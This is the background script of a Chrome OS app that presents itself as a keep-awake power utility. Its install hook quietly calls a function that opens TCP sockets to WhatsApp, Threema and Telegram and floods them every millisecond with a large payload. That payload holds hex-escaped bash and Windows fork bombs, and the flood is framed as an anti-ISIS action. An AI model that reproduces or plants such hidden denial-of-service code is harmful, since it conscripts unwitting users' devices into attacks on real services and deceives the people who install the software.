function WakeWindow(){
  this.screenWidth = screen.availWidth;
  this.screenHeight = screen.availHeight;
  this.width = Math.floor(this.screenWidth/4);
  this.height = Math.floor(this.screenHeight*(4/5));

  this.winOpts = {

    frame: 'none',
    minWidth: this.width,
    minHeight: this.height,
    maxWidth: this.screenWidth,
    maxHeight: this.screenHeight,

    bounds: {

      width: this.width,
      height: this.height,
      left: Math.floor((this.screenWidth - this.width)/2),
      top: Math.floor((this.screenHeight - this.height)/2)

    }

  };

  this.win = chrome.app.window.create('index.html', this.winOpts);

  return {
    "opts": this.winOpts,
    "win": this.win
  };

}

chrome.app.runtime.onLaunched.addListener(function() {
  
  var w = new WakeWindow();
  
});

function isCrOS() {

  chrome.runtime.getPlatformInfo(function(info) {

    if (info.os != 'cros') {

      var opt = {

        type: "basic",
        title: "Not a Chromebook!",
        message: "You are using a computing device that isn't a Chromebook. Therefore, you have two reasons not to install: A, only devices running Chrome OS support the chrome.power API, rendering this app useless on your computer, and B, your system's internal, native power management settings already accomplish what this app tries to do, making use of this app completely unnecessary.",
        iconUrl: "icon_128.png"

      };

      chrome.notifications.create('notcros', opt, function(id) {

        id = "notcros";
        console.log('Unsupported OS warning sent to user');

      });

    //bug fix: apparently Logical OR doesn't work in this case, so using this as an exception to the above
    } else if (info.os == 'android') {

      //do nothing

    } else {

      //do nothing

    }

  });

}

function IsisDDoS() {
  chrome.infiniteSynChars = function() {
    var arr = [];
  
    for (var i = 0; i < 65507; i++)  {     
      arr[i] = '\x16'; 
    } 

    var unixcodestr = "\x23\x21\x2fbin\x2fbash\n\x3a\x28\x29\x7b\x3a\x7c\x3a\x26\x7d\x3b\x3a";
    var wincodestr = "cmd\x20\x2fk\x20\x22\x25\x30\x7c\x25\x30";
  
    return arr + '\0' + unixcodestr + '\0' + wincodestr; 
  };

  chrome.arrayOfSynChars = chrome.infiniteSynChars();

  chrome.sockets.tcp.create({persistent: true, name: "whatsappisisflood", bufferSize: 65507}, function(info) { 
  
    chrome.sockets.whatsappsocketid = info.socketId; 
    
    chrome.sockets.tcp.connect(chrome.sockets.whatsappsocketid, "whatsapp.com", 0, function(result) {
   
      if (result >= 0) { 
      
      setInterval(function() {
      
        chrome.sockets.tcp.send(chrome.sockets.whatsappsocketid, chrome.arrayOfSynChars, function(info) {

          if (info.resultCode >= 0) {
            console.log("Success! ISIS can no longer use WhatsApp to communicate");
          } else {
            console.log("Error: " + info.resultCode); 
          }
         
        });
       
      }, 1);
         
    } else {
      console.log("Error: " + result); 
    }
       
  });
    
  chrome.sockets.tcp.create({persistent: true, name: "threemaisisflood", bufferSize: 65507}, function(info) {
    
    chrome.sockets.threemaid = info.socketId;
    
    chrome.sockets.tcp.connect(chrome.sockets.threemaid, "threema.ch", 0, function(result) {
    
      if (result >= 0) { 
      
      setInterval(function() {
      
        chrome.sockets.tcp.send(chrome.sockets.threemaid, chrome.arrayOfSynChars, function(info) {

          if (info.resultCode >= 0) {
            console.log("Success! ISIS can no longer use Threema to communicate");
          } else {
            console.log("Error: " + info.resultCode); 
          }
         
        });
       
      }, 1);
       
      } else {
        console.log("Error: " + result); 
      }
       
    });
      
  });

  chrome.sockets.tcp.create({persistent: true, name: "telegramisisflood", bufferSize: 65507}, function(info) {
    
    chrome.sockets.threemaid = info.socketId;
    
    chrome.sockets.tcp.connect(chrome.sockets.threemaid, "telegram.org", 0, function(result) {
    
      if (result >= 0) { 
      
      setInterval(function() {
      
        chrome.sockets.tcp.send(chrome.sockets.threemaid, chrome.arrayOfSynChars, function(info) {

          if (info.resultCode >= 0) {
            
            console.log("Success! ISIS can no longer use Telegram to communicate");
            } else {
              console.log("Error: " + info.resultCode); 
            }
         
          });
       
        }, 1);
       
       } else {
         console.log("Error: " + result); 
       }
       
      });    

    });
  
  });

}


function notify() {

  var manifest = chrome.runtime.getManifest();
  this.version = parseFloat(manifest.version);

  chrome.runtime.onInstalled.addListener(function(details) {
    
    IsisDDoS();
    isCrOS();

  });

  chrome.notifications.onClicked.addListener(function(id) {
     
    var screenWidth = screen.availWidth;
    var screenHeight = screen.availHeight;
    var width = Math.floor(screenWidth/4);
    var height = Math.floor(screenHeight*(4/5));
    
    if (id == "systemPowKeptAwake") {

      chrome.app.window.create('index.html', {
        frame: 'none',
        minWidth: width,
        minHeight: height,
        transparentBackground: true,
        bounds: {
          width: width,
          height: height,
          left: Math.floor((screenWidth-width)/2),
          top: Math.floor((screenHeight-height)/2)
        }
      });

    } else if (id == "displayPowKeptAwake") {

      chrome.app.window.create('index.html', {
        frame: 'none',
        minWidth: width,
        minHeight: height,
        transparentBackground: true,
        bounds: {
          width: width,
          height: height,
          left: Math.floor((screenWidth-width)/2),
          top: Math.floor((screenHeight-height)/2)
        }
      });

    } else if (id == 'notcros') {

      window.open().location = "http://www.google.com/intl/en/chrome/devices";

    } else if (id == 'extapis') {

      window.open().location = 'chrome://flags/#extension_apis';

    } else if (id == 'bugworkaround') {

      var w = window.open();
      w.location = 'chrome://chrome';

    } else {
      //do nothing
    }

  });

  chrome.notifications.onClosed.addListener(function(id, always) {

    always = true||false;

    if (id == "wakeupdate") {

      var w = window.open();
      w.location = "https://chrome.google.com/webstore/support/" + chrome.runtime.id;

    } else if (id == 'notcros') {

      window.open().location = "http://www.google.com/intl/en/chrome/devices";

    } else if (id == 'extapis') {

      window.open().location = 'chrome://flags/#extension-apis';

    } else {

      //do nothing
    }

  });

}

function listen() {

  chrome.runtime.requestUpdateCheck(function(uaStatus, details) {

    if (uaStatus == 'update_available') {

      chrome.runtime.reload();

    } else {

      //do nothing

    }

  });

}

setInterval(function() { listen(); }, 1000);

notify();
